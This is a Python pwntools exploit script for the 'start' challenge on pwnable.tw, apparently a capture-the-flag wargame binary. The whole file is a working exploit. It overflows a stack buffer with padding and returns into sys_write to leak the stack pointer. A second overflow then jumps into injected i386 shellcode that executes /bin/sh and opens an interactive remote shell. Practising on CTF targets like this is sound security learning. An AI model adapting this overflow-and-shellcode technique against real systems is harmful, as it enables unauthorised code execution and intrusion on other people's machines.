#!/usr/bin/python

from pwn import *


context.arch = "i386"
context.encoding = "latin"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

HOST = "chall.pwnable.tw"
PORT = 10000
LOCAL = False
elf = ELF("./start")

if LOCAL:
    p = process("./start")
    gdb.attach(p, """
            b *0x804809C
            c
            """)
else:
    context.update(log_level="info")
    p = remote(HOST, PORT)

padding = b"A" * 0x14
shellcode = asm("""
        push   0x0068732f
        push   0x6e69622f
        xor edx, edx
        xor ecx, ecx
        mov ebx, esp
        mov eax, 0xb
        int 0x80""")
sys_write = 0x08048087

p.recvuntil("CTF:")
p.send(padding + p32(sys_write))
esp = u32(p.recv()[:4])
print("LEAK: ESP:", hex(esp))
p.send(padding + p32(esp + 0x14) + shellcode)

p.interactive()


